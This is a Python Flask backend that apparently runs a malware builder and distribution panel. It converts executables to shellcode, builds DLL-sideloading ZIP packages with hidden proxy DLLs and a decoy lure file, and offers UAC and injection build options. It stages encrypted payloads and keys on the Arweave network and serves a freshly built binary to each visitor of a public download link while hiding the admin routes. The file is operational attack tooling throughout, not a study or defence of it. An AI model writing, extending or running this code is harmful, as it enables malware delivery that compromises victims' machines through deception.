def api_profiles_encrypt_create():
    data = request.get_json(force=True, silent=True) or {}
    profile = {
        "id":               _new_id(),
        "type":             "encrypt",
        "name":             (data.get("name") or "Unnamed").strip(),
        "shellcode_job_id": data.get("shellcode_job_id", ""),
        "wallet_id":        data.get("wallet_id", ""),
        "created_at":       int(time.time()),
    }
    profiles = _load_profiles()
    profiles.insert(0, profile)
    _save_profiles(profiles)
    return jsonify({"ok": True, "profile": profile})


@app.route("/api/profiles/build")
def api_profiles_build_list():
    return jsonify([p for p in _load_profiles() if p.get("type") == "build"])


@app.route("/api/profiles/build", methods=["POST"])
def api_profiles_build_create():
    data = request.get_json(force=True, silent=True) or {}
    profile = {
        "id":                  _new_id(),
        "type":                "build",
        "name":                (data.get("name") or "Unnamed").strip(),
        "encrypt_history_id":  data.get("encrypt_history_id", ""),
        "dll_id":              data.get("dll_id", ""),
        "exe_id":              data.get("exe_id", ""),
        "sideload_rename":     data.get("sideload_rename", ""),
        "host_rename":         data.get("host_rename", ""),
        "zip_name":            data.get("zip_name", ""),
        "bind_id":             data.get("bind_id", ""),
        "bind_rename":         data.get("bind_rename", ""),
        "mode":                data.get("mode", "exe"),
        "uac":                 bool(data.get("uac")),
        "rwx":                 bool(data.get("rwx")),
        "debug":               bool(data.get("debug")),
        "inject":              bool(data.get("inject")),
        "created_at":          int(time.time()),
    }
    profiles = _load_profiles()
    profiles.insert(0, profile)
    _save_profiles(profiles)
    return jsonify({"ok": True, "profile": profile})


@app.route("/api/profiles/<pid>", methods=["PUT"])
def api_profiles_update(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    data = request.get_json(force=True, silent=True) or {}
    profiles = _load_profiles()
    idx = next((i for i, p in enumerate(profiles) if p["id"] == pid), None)
    if idx is None:
        return jsonify({"ok": False, "error": "not found"}), 404
    existing = profiles[idx]
    ptype = existing.get("type", "encrypt")
    update = {"name": (data.get("name") or existing["name"]).strip(), "updated_at": int(time.time())}
    if ptype == "encrypt":
        update.update({
            "shellcode_job_id": data.get("shellcode_job_id", existing.get("shellcode_job_id", "")),
            "wallet_id":        data.get("wallet_id",        existing.get("wallet_id", "")),
        })
    else:
        update.update({
            "encrypt_history_id": data.get("encrypt_history_id", existing.get("encrypt_history_id", "")),
            "dll_id":             data.get("dll_id",          existing.get("dll_id", "")),
            "exe_id":             data.get("exe_id",          existing.get("exe_id", "")),
            "sideload_rename":    data.get("sideload_rename", existing.get("sideload_rename", "")),
            "host_rename":        data.get("host_rename",     existing.get("host_rename", "")),
            "zip_name":           data.get("zip_name",        existing.get("zip_name", "")),
            "bind_id":            data.get("bind_id",         existing.get("bind_id", "")),
            "bind_rename":        data.get("bind_rename",     existing.get("bind_rename", "")),
            "mode":               data.get("mode",            existing.get("mode", "exe")),
            "uac":                bool(data.get("uac")),
            "rwx":                bool(data.get("rwx")),
            "debug":              bool(data.get("debug")),
            "inject":             bool(data.get("inject")),
        })
    existing.update(update)
    profiles[idx] = existing
    _save_profiles(profiles)
    return jsonify({"ok": True, "profile": existing})


@app.route("/api/profiles/<pid>", methods=["DELETE"])
def api_profiles_delete(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    profiles = [p for p in _load_profiles() if p["id"] != pid]
    _save_profiles(profiles)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Donut  (EXE → shellcode)  —  workspace/donut/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/donut/jobs")
def api_donut_jobs():
    return jsonify(_load_donut_jobs())


CONVERT_SCRIPT = PROJECT_ROOT / "donut" / "convert_to_64bit.py"


@app.route("/api/donut", methods=["POST"])
def api_donut():
    if "exe" not in request.files:
        return jsonify({"ok": False, "stderr": "exe file missing"}), 400
    if not DONUT_EXE.is_file():
        return jsonify({"ok": False, "stderr": "donut\\donut.exe not found"}), 500

    arch = (request.form.get("arch") or "2").strip()
    if arch not in ("1", "2", "3"):
        arch = "2"

    job_id  = _new_id()
    job_dir = DONUT_DIR / job_id
    job_dir.mkdir(parents=True, exist_ok=True)

    upload   = request.files["exe"]
    name     = _safe_name(upload.filename or "payload.exe") or "payload.exe"
    label    = (request.form.get("label") or "").strip()[:64]
    exe_path = job_dir / name
    upload.save(str(exe_path))

    converted = False
    convert_stderr = ""

    # x86 selected → convert to 64-bit AnyCPU before running donut
    if arch == "1" and CONVERT_SCRIPT.is_file():
        stem      = Path(name).stem
        ext       = Path(name).suffix or ".exe"
        name_64   = stem + "_64" + ext
        path_64   = job_dir / name_64
        cv = _run([sys.executable, str(CONVERT_SCRIPT), str(exe_path), "-o", str(path_64)])
        if cv["ok"] and path_64.is_file():
            # replace the uploaded 32-bit file with the 64-bit version
            exe_path.unlink(missing_ok=True)
            exe_path  = path_64
            name      = name_64
            arch      = "2"   # force x64 for donut
            converted = True
        else:
            convert_stderr = (cv["stderr"] or cv["stdout"] or "convert_to_64bit.py failed").strip()
            # fall through: let donut try the original file anyway

    arch_label = {"1": "x86", "2": "x64", "3": "x86+x64"}[arch]
    out_path   = job_dir / "shellcode.bin"

    result = _run([str(DONUT_EXE), "-a", arch, "-i", str(exe_path), "-o", str(out_path)])
    if convert_stderr:
        result["stderr"] = f"[convert_to_64bit] {convert_stderr}\n" + (result.get("stderr") or "")

    meta = {
        "id":            job_id,
        "original_name": name,
        "label":         label,
        "arch":          arch,
        "arch_label":    arch_label,
        "converted":     converted,
        "created_at":    int(time.time()),
        "ok":            result["ok"],
        "size_in":       exe_path.stat().st_size if exe_path.is_file() else 0,
        "size_out":      out_path.stat().st_size if (result["ok"] and out_path.is_file()) else 0,
    }
    (job_dir / "meta.json").write_text(json.dumps(meta, indent=2))
    result["job"] = meta
    return jsonify(result)


@app.route("/api/donut/jobs/<jid>/download/<ftype>")
def api_donut_download(jid, ftype):
    if not _ID_RE.match(jid):
        return "invalid", 400
    job_dir = DONUT_DIR / jid
    if not job_dir.is_dir():
        return "not found", 404
    if ftype == "shellcode":
        path, dl = job_dir / "shellcode.bin", "shellcode.bin"
    elif ftype == "original":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        fname = json.loads(mf.read_text()).get("original_name", "payload.exe")
        path, dl = job_dir / fname, fname
    else:
        return "invalid", 400
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=dl)


@app.route("/api/donut/jobs/<jid>", methods=["PATCH"])
def api_donut_patch(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    data  = request.get_json(force=True, silent=True) or {}
    label = (data.get("label") or "").strip()[:64]
    mf    = DONUT_DIR / jid / "meta.json"
    if not mf.is_file():
        return jsonify({"ok": False, "stderr": "job not found"}), 404
    meta          = json.loads(mf.read_text())
    meta["label"] = label
    mf.write_text(json.dumps(meta, indent=2))
    return jsonify({"ok": True, "meta": meta})


@app.route("/api/donut/jobs/<jid>", methods=["DELETE"])
def api_donut_delete(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    jdir = DONUT_DIR / jid
    if jdir.is_dir():
        shutil.rmtree(str(jdir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# DLL workspace  —  workspace/dlls/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/dlls")
def api_dlls_list():
    return jsonify(_load_dlls())


@app.route("/api/dlls", methods=["POST"])
def api_dlls_upload():
    if "dll" not in request.files:
        return jsonify({"ok": False, "stderr": "dll file missing"}), 400
    meta = _upload_asset(DLLS_DIR, request.files["dll"], "target.dll")
    return jsonify({"ok": True, "dll": meta})


@app.route("/api/dlls/<did>", methods=["DELETE"])
def api_dlls_delete(did):
    if not _ID_RE.match(did):
        return jsonify({"ok": False}), 400
    ddir = DLLS_DIR / did
    if ddir.is_dir():
        shutil.rmtree(str(ddir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# EXE workspace  —  workspace/exes/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/exes")
def api_exes_list():
    return jsonify(_load_exes())


@app.route("/api/exes", methods=["POST"])
def api_exes_upload():
    if "exe" not in request.files:
        return jsonify({"ok": False, "stderr": "exe file missing"}), 400
    meta = _upload_asset(EXES_DIR, request.files["exe"], "host.exe")
    return jsonify({"ok": True, "exe": meta})


@app.route("/api/exes/<eid>", methods=["DELETE"])
def api_exes_delete(eid):
    if not _ID_RE.match(eid):
        return jsonify({"ok": False}), 400
    edir = EXES_DIR / eid
    if edir.is_dir():
        shutil.rmtree(str(edir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Bind files workspace  —  workspace/binds/<id>/
# ---------------------------------------------------------------------------

@app.route("/api/binds")
def api_binds_list():
    return jsonify(_load_binds())


@app.route("/api/binds", methods=["POST"])
def api_binds_upload():
    if "bind" not in request.files:
        return jsonify({"ok": False, "stderr": "bind file missing"}), 400
    meta = _upload_asset(BINDS_DIR, request.files["bind"], "lure.pdf")
    return jsonify({"ok": True, "bind": meta})


@app.route("/api/binds/<bid>", methods=["DELETE"])
def api_binds_delete(bid):
    if not _ID_RE.match(bid):
        return jsonify({"ok": False}), 400
    bdir = BINDS_DIR / bid
    if bdir.is_dir():
        shutil.rmtree(str(bdir), ignore_errors=True)
    return jsonify({"ok": True})


@app.route("/api/binds/<bid>/download")
def api_binds_download(bid):
    if not _ID_RE.match(bid):
        return "invalid", 400
    meta = _find_asset(BINDS_DIR, bid)
    if not meta:
        return "not found", 404
    safe = _safe_name(meta["name"])
    if not safe:
        return "invalid", 400
    path = BINDS_DIR / bid / safe
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=safe)


# ---------------------------------------------------------------------------
# Wallets  —  workspace/arweave/<id>/  (Arweave JWK wallets)
# ---------------------------------------------------------------------------

@app.route("/api/wallets")
def api_wallets_list():
    return jsonify(_load_wallets())


@app.route("/api/wallets", methods=["POST"])
def api_wallets_create():
    data = request.get_json(force=True, silent=True) or {}
    name = (data.get("name") or "Wallet").strip()

    existing_names = {w["name"] for w in _load_wallets()}
    if name in existing_names:
        i = 2
        while f"{name} {i}" in existing_names:
            i += 1
        name = f"{name} {i}"

    result = _run([sys.executable, str(ARWEAVE_SCRIPTS_DIR / "create.py"), "--json"])
    if not result["ok"]:
        return jsonify({"ok": False, "stderr": result.get("stderr", "Script failed")})
    try:
        wdata = json.loads(result["stdout"].strip())
    except Exception:
        return jsonify({"ok": False, "stderr": "Failed to parse wallet output"})

    wid  = _new_id()
    meta = {"id": wid, "name": name, "address": wdata["public_key"],
            "created_at": int(time.time())}
    wdir = WALLETS_DIR / wid
    wdir.mkdir(parents=True, exist_ok=True)
    # Store the full JWK as wallet.json (the wallet IS the private key)
    (wdir / "wallet.json").write_text(json.dumps(wdata["wallet_jwk"]), encoding="utf-8")
    (wdir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")

    return jsonify({"ok": True, "wallet": meta})
    # wallet.json (JWK) intentionally NOT returned in body — download via /api/wallets/<id>/keypair


@app.route("/api/wallets/<wid>", methods=["PUT"])
def api_wallets_rename(wid):
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    data = request.get_json(force=True, silent=True) or {}
    name = (data.get("name") or "").strip()
    if not name:
        return jsonify({"ok": False, "stderr": "name required"}), 400
    meta = _find_wallet(wid)
    if not meta:
        return jsonify({"ok": False}), 404
    meta["name"] = name
    _save_wallet_meta(meta)
    return jsonify({"ok": True, "wallet": meta})


@app.route("/api/wallets/<wid>", methods=["DELETE"])
def api_wallets_delete(wid):
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wdir = WALLETS_DIR / wid
    if wdir.is_dir():
        shutil.rmtree(str(wdir), ignore_errors=True)
    return jsonify({"ok": True})


@app.route("/api/wallets/<wid>/keypair")
def api_wallets_keypair(wid):
    """Download the Arweave JWK wallet file."""
    if not _ID_RE.match(wid):
        return "invalid", 400
    kp = WALLETS_DIR / wid / "wallet.json"
    if not kp.is_file():
        return "not found", 404
    return send_file(str(kp), as_attachment=True, download_name="arweave-wallet.json")


@app.route("/api/wallets/<wid>/balance")
def api_wallets_balance(wid):
    """Fetch AR balance for the wallet from arweave.net."""
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wallet = _find_wallet(wid)
    if not wallet:
        return jsonify({"ok": False, "error": "wallet not found"}), 404
    address = wallet.get("address", "")
    if not address or not _ARW_ADDR_RE.match(address):
        return jsonify({"ok": False, "error": "invalid address"}), 400
    import urllib.request
    try:
        req = urllib.request.Request(
            f"https://arweave.net/wallet/{address}/balance",
            headers={"Accept": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            raw = resp.read(256).decode("utf-8", errors="replace").strip()
        winston = int(raw)
        ar = winston / 1_000_000_000_000
        return jsonify({"ok": True, "winston": winston, "ar": ar})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 502


@app.route("/api/wallets/<wid>/lookup", methods=["POST"])
def api_wallets_lookup(wid):
    """Scan recent Arweave transactions FROM this wallet via GraphQL and return parsed meta JSON."""
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wallet = _find_wallet(wid)
    if not wallet:
        return jsonify({"ok": False, "stderr": "wallet not found"}), 404

    address = wallet.get("address", "")
    if not address or not _ARW_ADDR_RE.match(address):
        return jsonify({"ok": False, "error": "wallet has no valid address"}), 400

    import urllib.request

    gql_body = json.dumps({
        "query": (
            '{ transactions(owners: ["' + address + '"],'
            ' first: 10, sort: HEIGHT_DESC,'
            ' tags: [{ name: "App-Name", values: ["ArSync"] }],'
            ' block: { min: 1 }) {'
            ' edges { node { id block { height } tags { name value } } } } }'
        )
    }).encode("utf-8")

    try:
        req = urllib.request.Request(
            "https://arweave.net/graphql",
            data=gql_body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            gql_resp = json.loads(resp.read(65536).decode("utf-8", errors="replace"))
    except Exception as e:
        return jsonify({"ok": False, "error": f"GraphQL request failed: {e}"}), 502

    try:
        edges = gql_resp["data"]["transactions"]["edges"]
    except (KeyError, TypeError):
        return jsonify({"ok": False, "error": "unexpected GraphQL response format"})

    results = []
    for edge in edges:
        try:
            node = edge["node"]
            tx_id = node["id"]
        except (KeyError, TypeError):
            continue
        if not _ARW_ADDR_RE.match(tx_id):
            continue
        block_height = (node.get("block") or {}).get("height")
        tags = {t["name"]: t["value"] for t in node.get("tags", []) if "name" in t and "value" in t}
        url = f"https://arweave.net/{tx_id}"
        entry: dict = {"tx_id": tx_id, "url": url, "block": block_height, "tags": tags, "payload_v2": False, "meta": None, "error": None}
        _COMBINED_HDR_RE = re.compile(rb'^[0-9a-f]{32}\|[0-9a-f]{24}\|\d+\|[01]\|')
        try:
            with urllib.request.urlopen(url, timeout=15) as tx_resp:
                body_raw = tx_resp.read(4096)
            if _COMBINED_HDR_RE.match(body_raw[:120]):
                # New combined format — key is embedded in the header
                entry["payload_v2"] = True
                header_end = body_raw.index(b"|", body_raw.index(b"|", body_raw.index(b"|", body_raw.index(b"|") + 1) + 1) + 1) + 1
                entry["header"] = body_raw[:header_end].decode("ascii")
            else:
                body = body_raw.decode("utf-8", errors="replace")
                try:
                    meta_obj = json.loads(body)
                    if isinstance(meta_obj, dict) and "url" in meta_obj and "key" in meta_obj:
                        entry["meta"] = meta_obj  # old format meta JSON
                    else:
                        entry["raw"] = body[:512]
                except Exception:
                    entry["raw"] = body[:512]
        except urllib.error.HTTPError as e:
            if e.code in (404, 410, 500, 503, 504, 570):
                entry["pending"] = True  # data not yet propagated to gateway
            else:
                entry["error"] = f"HTTP {e.code}"
        except Exception as e:
            entry["error"] = str(e)
        results.append(entry)

    return jsonify({"ok": True, "address": address, "transactions": results})


@app.route("/api/wallets/<wid>/publish", methods=["POST"])
def api_wallets_publish(wid):
    """
    Standalone Arweave upload: upload a combined data.enc directly.

    Multipart form:
      data_enc  — combined file produced by Encrypt.py
                  (format: hex_key|hex_nonce|size|compressed|<binary>)
    """
    if not _ID_RE.match(wid):
        return jsonify({"ok": False}), 400
    wallet = _find_wallet(wid)
    if not wallet:
        return jsonify({"ok": False, "stderr": "wallet not found"}), 404

    wallet_path = WALLETS_DIR / wid / "wallet.json"
    if not wallet_path.is_file():
        return jsonify({"ok": False, "stderr": "wallet.json not on server — re-create wallet"}), 404

    if "data_enc" not in request.files:
        return jsonify({"ok": False, "stderr": "data_enc file required"}), 400

    tmp_id  = _new_id()
    tmp_dir = WORKSPACE / "_tmp" / tmp_id
    tmp_dir.mkdir(parents=True, exist_ok=True)
    try:
        dat_path = tmp_dir / "data.enc"
        request.files["data_enc"].save(str(dat_path))

        argv = [
            sys.executable,
            str(ARWEAVE_SCRIPTS_DIR / "upload.py"),
            str(dat_path), str(wallet_path),
            "--json",
        ]
        result = _run(argv)
        if result["ok"]:
            json_line = next(
                (l for l in result["stdout"].splitlines() if l.strip().startswith("{")),
                None,
            )
            if json_line:
                try:
                    parsed = json.loads(json_line)
                    result.update(parsed)
                    result["stdout"] = ""
                except Exception:
                    pass
    finally:
        shutil.rmtree(str(tmp_dir), ignore_errors=True)

    return jsonify(result)


# ---------------------------------------------------------------------------
# Download Pool system
# ---------------------------------------------------------------------------
#
# Public endpoint:  GET /d/<slug>
#   → serve one ready build, trigger background refill
# Admin endpoints:  /api/pools/*  (restrict via nginx — only /d/ is public)
#
# nginx example:
#   location /d/  { proxy_pass http://127.0.0.1:7890; }
#   location /    { allow 127.0.0.1; deny all; proxy_pass http://127.0.0.1:7890; }
#
# ---------------------------------------------------------------------------

_POOL_SLUG_RE = re.compile(r'^[a-z0-9][a-z0-9-]{0,29}$')

_BUILD_LOCK   = threading.Lock()          # serialise all pool builds globally
_pool_fill_mu = threading.Lock()          # guard _pool_fill_active
_pool_fill_active: set[str] = set()       # pool IDs with a fill thread running
_pool_dl_locks: dict[str, threading.Lock] = defaultdict(threading.Lock)  # per-pool download lock


# ── pool metadata ──────────────────────────────────────────────────────────

def _load_pools() -> list:
    if POOLS_FILE.is_file():
        try:
            return json.loads(POOLS_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return []


def _save_pools(pools: list) -> None:
    POOLS_FILE.write_text(json.dumps(pools, indent=2, ensure_ascii=False), encoding="utf-8")


def _find_pool(pid: str) -> dict | None:
    return next((p for p in _load_pools() if p["id"] == pid), None)


def _find_pool_by_slug(slug: str) -> dict | None:
    return next((p for p in _load_pools() if p.get("slug") == slug), None)


def _is_pool_filling(pid: str) -> bool:
    with _pool_fill_mu:
        return pid in _pool_fill_active


# ── pool item storage ──────────────────────────────────────────────────────
# Layout: workspace/pools/<pool_id>/ready/<item_id>/
#           <filename>          ← the actual binary / zip
#           meta.json           ← {"name": "<filename>", "created_at": <ts>}

def _pool_ready_dir(pool_id: str) -> Path:
    d = POOLS_DIR / pool_id / "ready"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _pool_ready_count(pool_id: str) -> int:
    d = POOLS_DIR / pool_id / "ready"
    if not d.is_dir():
        return 0
    return sum(
        1 for sub in d.iterdir()
        if sub.is_dir() and (sub / "meta.json").is_file()
    )


def _pool_pop_item(pool_id: str) -> tuple[Path, str] | None:
    """Return (file_path, download_name) for the oldest ready item, or None.
    Caller must hold the per-pool download lock.
    """
    d = POOLS_DIR / pool_id / "ready"
    if not d.is_dir():
        return None
    items: list[tuple[int, Path, str]] = []
    for sub in d.iterdir():
        if not sub.is_dir():
            continue
        mf = sub / "meta.json"
        if not mf.is_file():
            continue
        try:
            m = json.loads(mf.read_text(encoding="utf-8"))
            items.append((m.get("created_at", 0), sub, m.get("name", "")))
        except Exception:
            pass
    if not items:
        return None
    items.sort(key=lambda x: x[0])
    _, item_dir, name = items[0]
    safe = _safe_name(name)
    if not safe:
        return None
    fp = item_dir / safe
    if not fp.is_file():
        return None
    return fp, safe


# ── pool build helpers ─────────────────────────────────────────────────────

def _pool_store_exe(pool_id: str, item_id: str, src: Path, filename: str) -> bool:
    """Copy finished EXE into pool ready dir."""
    ready_dir = _pool_ready_dir(pool_id)
    item_dir  = ready_dir / item_id
    item_dir.mkdir(parents=True, exist_ok=True)
    try:
        shutil.copy2(str(src), str(item_dir / filename))
        meta = {"name": filename, "created_at": int(time.time())}
        (item_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
        return True
    except Exception:
        shutil.rmtree(str(item_dir), ignore_errors=True)
        return False


def _pool_store_zip(
    pool_id: str, item_id: str,
    dll_name: str, dll_src: Path, exe_src: Path,
    sideload_rename: str, host_rename: str,
    bind_src: Path | None, bind_name: str, bind_rename: str,
    safe_zip: str,
) -> bool:
    """Build delivery ZIP and store in pool ready dir."""
    _ATTR_HIDDEN_FILE = 0x20 | 0x02
    _ATTR_HIDDEN_DIR  = 0x10 | 0x02
    ready_dir = _pool_ready_dir(pool_id)
    item_dir  = ready_dir / item_id
    item_dir.mkdir(parents=True, exist_ok=True)
    zip_path  = item_dir / safe_zip
    try:
        with zipfile.ZipFile(str(zip_path), "w", zipfile.ZIP_DEFLATED) as zf:
            # proxy DLL (hidden)
            proxy = PROJECT_ROOT / dll_name
            if proxy.is_file():
                zi = zipfile.ZipInfo(dll_name)
                zi.compress_type = zipfile.ZIP_DEFLATED
                zi.external_attr = _ATTR_HIDDEN_FILE
                with open(str(proxy), "rb") as fh:
                    zf.writestr(zi, fh.read())
            # original DLL renamed (hidden)
            orig_arc = sideload_rename if sideload_rename else (
                Path(dll_name).stem + "_orig" + Path(dll_name).suffix)
            if dll_src.is_file():
                zi2 = zipfile.ZipInfo(orig_arc)
                zi2.compress_type = zipfile.ZIP_DEFLATED
                zi2.external_attr = _ATTR_HIDDEN_FILE
                with open(str(dll_src), "rb") as fh:
                    zf.writestr(zi2, fh.read())
            # host EXE
            if exe_src.is_file():
                zf.write(str(exe_src), host_rename if host_rename else exe_src.name)
            # bind/lure file
            if bind_src and bind_src.is_file():
                arc = bind_rename if bind_rename else bind_name
                safe_arc = _safe_name(arc) or bind_name
                dir_zi = zipfile.ZipInfo("_/")
                dir_zi.external_attr = _ATTR_HIDDEN_DIR
                zf.writestr(dir_zi, b"")
                bind_zi = zipfile.ZipInfo(f"_/{safe_arc}")
                bind_zi.compress_type = zipfile.ZIP_DEFLATED
                bind_zi.external_attr = 0
                with open(str(bind_src), "rb") as fh:
                    zf.writestr(bind_zi, fh.read())
        meta = {"name": safe_zip, "created_at": int(time.time())}
        (item_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
        return True
    except Exception:
        shutil.rmtree(str(item_dir), ignore_errors=True)
        return False


def _run_pool_build_locked(pool: dict) -> bool:
    """Build one binary for the pool. Must be called while _BUILD_LOCK is held."""
    profile_id = (pool.get("profile_id") or "")
    if not profile_id or not _ID_RE.match(profile_id):
        return False
    profiles = _load_profiles()
    profile = next(
        (p for p in profiles if p["id"] == profile_id and p.get("type") == "build"),
        None,
    )
    if not profile:
        return False

    pool_id = pool["id"]
    item_id = _new_id()

    # copy Payload.h from encrypt history
    enc_hist_id = (profile.get("encrypt_history_id") or "").strip()
    if enc_hist_id and _ID_RE.match(enc_hist_id):
        ph_src = ENCRYPT_HISTORY_DIR / enc_hist_id / "Payload.h"
        if ph_src.is_file():
            shutil.copy2(str(ph_src), str(PROJECT_ROOT / "Payload.h"))

    mode            = profile.get("mode", "exe")
    uac             = bool(profile.get("uac"))
    rwx             = bool(profile.get("rwx"))
    debug           = bool(profile.get("debug"))
    inject          = bool(profile.get("inject")) and mode == "sideload"
    dll_id          = (profile.get("dll_id")          or "").strip()
    exe_id          = (profile.get("exe_id")          or "").strip()
    sideload_rename = (profile.get("sideload_rename") or "").strip()
    host_rename     = (profile.get("host_rename")     or "").strip()
    zip_name        = (profile.get("zip_name")        or "").strip()
    bind_id         = (profile.get("bind_id")         or "").strip()
    bind_rename     = (profile.get("bind_rename")     or "").strip()

    extras: list[str] = []
    if rwx:    extras.append("/DRWX_SHELLCODE")
    if debug:  extras.append("/DDEBUG")
    if inject: extras.append("/DENABLE_INJECT")
    env = os.environ.copy()
    if extras:
        env["CFLAGS_EXTRA"] = " ".join(extras)

    if mode == "sideload":
        if not dll_id or not _ID_RE.match(dll_id) or not exe_id or not _ID_RE.match(exe_id):
            return False
        dll_meta = _find_asset(DLLS_DIR, dll_id)
        exe_meta = _find_asset(EXES_DIR, exe_id)
        if not dll_meta or not exe_meta:
            return False
        dll_name     = dll_meta["name"]
        exe_name     = exe_meta["name"]
        dll_path_obj = DLLS_DIR / dll_id / dll_name
        exe_path_obj = EXES_DIR / exe_id / exe_name
        if not dll_path_obj.is_file() or not exe_path_obj.is_file():
            return False

        sg_argv = [sys.executable, "SideloadGen.py", str(dll_path_obj), "--exe", exe_name]
        if sideload_rename:
            safe = _safe_name(sideload_rename)
            if safe:
                sg_argv += ["--rename", safe]
        if not _run(sg_argv)["ok"]:
            _cleanup_build_artifacts()
            return False

        build_args = ["build.bat", "sideload", dll_name]
        if uac:
            build_args.append("uac")
        try:
            proc = subprocess.run(build_args, cwd=str(PROJECT_ROOT), env=env,
                                  capture_output=True, text=True, timeout=180, shell=True)
        except Exception:
            _cleanup_build_artifacts()
            return False
        if proc.returncode != 0:
            _cleanup_build_artifacts(dll_name)
            return False
        if not zip_name:
            _cleanup_build_artifacts(dll_name)
            return False

        safe_zip = _safe_name(
            zip_name if zip_name.lower().endswith(".zip") else zip_name + ".zip"
        ) or "output.zip"

        bind_src = None
        bind_orig = ""
        if bind_id and _ID_RE.match(bind_id):
            bm = _find_asset(BINDS_DIR, bind_id)
            if bm:
                bind_orig = bm["name"]
                bp = BINDS_DIR / bind_id / bind_orig
                if bp.is_file():
                    bind_src = bp

        ok = _pool_store_zip(
            pool_id, item_id,
            dll_name, dll_path_obj, exe_path_obj,
            sideload_rename, host_rename,
            bind_src, bind_orig, bind_rename,
            safe_zip,
        )
        _cleanup_build_artifacts(dll_name)
        return ok

    else:  # exe
        build_args = ["build.bat"]
        if uac:
            build_args.append("uac")
        try:
            proc = subprocess.run(build_args, cwd=str(PROJECT_ROOT), env=env,
                                  capture_output=True, text=True, timeout=180, shell=True)
        except Exception:
            _cleanup_build_artifacts()
            return False
        if proc.returncode != 0:
            _cleanup_build_artifacts()
            return False
        binary_name = "msoia.exe"
        binary_src  = PROJECT_ROOT / binary_name
        if not binary_src.is_file():
            _cleanup_build_artifacts()
            return False
        ok = _pool_store_exe(pool_id, item_id, binary_src, binary_name)
        _cleanup_build_artifacts(binary_name)
        return ok


def _pool_fill_worker(pool: dict) -> None:
    pool_id = pool["id"]
    try:
        while True:
            # Re-read pool from disk on every iteration so target_count/paused changes apply
            current_pool = _find_pool(pool_id)
            if not current_pool:
                break
            if current_pool.get("paused"):
                break
            if _pool_ready_count(pool_id) >= current_pool.get("target_count", 10):
                break
            with _BUILD_LOCK:
                # Re-check after acquiring the lock — another thread may have built
                current_pool = _find_pool(pool_id)
                if not current_pool:
                    break
                if current_pool.get("paused"):
                    break
                if _pool_ready_count(pool_id) >= current_pool.get("target_count", 10):
                    break
                success = _run_pool_build_locked(current_pool)
                if not success:
                    # Build failed — wait a bit before retrying to avoid busy-loop
                    time.sleep(5)
    finally:
        with _pool_fill_mu:
            _pool_fill_active.discard(pool_id)


def _trigger_pool_fill(pool: dict) -> None:
    pool_id = pool["id"]
    # Quick check without the lock first
    current_pool = _find_pool(pool_id)
    if not current_pool:
        return
    if _pool_ready_count(pool_id) >= current_pool.get("target_count", 10):
        return
    with _pool_fill_mu:
        if pool_id in _pool_fill_active:
            return
        _pool_fill_active.add(pool_id)
    t = threading.Thread(target=_pool_fill_worker, args=(current_pool,), daemon=True,
                         name=f"pool-fill-{pool_id}")
    t.start()


# ── public download endpoint ───────────────────────────────────────────────

@app.route("/d/<slug>")
def pool_download(slug):
    if not _POOL_SLUG_RE.match(slug):
        return "not found", 404
    pool = _find_pool_by_slug(slug)
    if not pool:
        return "not found", 404

    pool_id = pool["id"]
    with _pool_dl_locks[pool_id]:
        item = _pool_pop_item(pool_id)
        if item is None:
            _trigger_pool_fill(pool)
            return Response(
                "No builds ready — refilling now, please retry shortly.",
                status=503,
                headers={"Retry-After": "30", "Content-Type": "text/plain"},
            )
        file_path, filename = item
        try:
            data = file_path.read_bytes()
        except Exception:
            return "error reading file", 500
        shutil.rmtree(str(file_path.parent), ignore_errors=True)

    _trigger_pool_fill(pool)
    return send_file(
        io.BytesIO(data),
        as_attachment=True,
        download_name=filename,
        mimetype="application/octet-stream",
    )


# ── admin pool management ──────────────────────────────────────────────────

@app.route("/api/pools")
def api_pools_list():
    pools = _load_pools()
    return jsonify([
        {**p, "ready_count": _pool_ready_count(p["id"]), "building": _is_pool_filling(p["id"]), "paused": bool(p.get("paused"))}
        for p in pools
    ])


@app.route("/api/pools", methods=["POST"])
def api_pools_create():
    data = request.get_json(force=True, silent=True) or {}
    slug = (data.get("slug") or "").strip().lower()
    if not _POOL_SLUG_RE.match(slug):
        return jsonify({"ok": False, "error": "invalid slug — lowercase alphanum + hyphens, 1–30 chars"}), 400
    if _find_pool_by_slug(slug):
        return jsonify({"ok": False, "error": "slug already in use"}), 409
    profile_id = (data.get("profile_id") or "").strip()
    if not profile_id or not _ID_RE.match(profile_id):
        return jsonify({"ok": False, "error": "valid build profile_id required"}), 400
    try:
        target = max(1, min(50, int(data.get("target_count") or 10)))
    except (TypeError, ValueError):
        target = 10
    pool = {
        "id":           _new_id(),
        "slug":         slug,
        "name":         (data.get("name") or slug).strip(),
        "profile_id":   profile_id,
        "target_count": target,
        "created_at":   int(time.time()),
    }
    pools = _load_pools()
    pools.insert(0, pool)
    _save_pools(pools)
    _trigger_pool_fill(pool)
    return jsonify({"ok": True, "pool": pool})


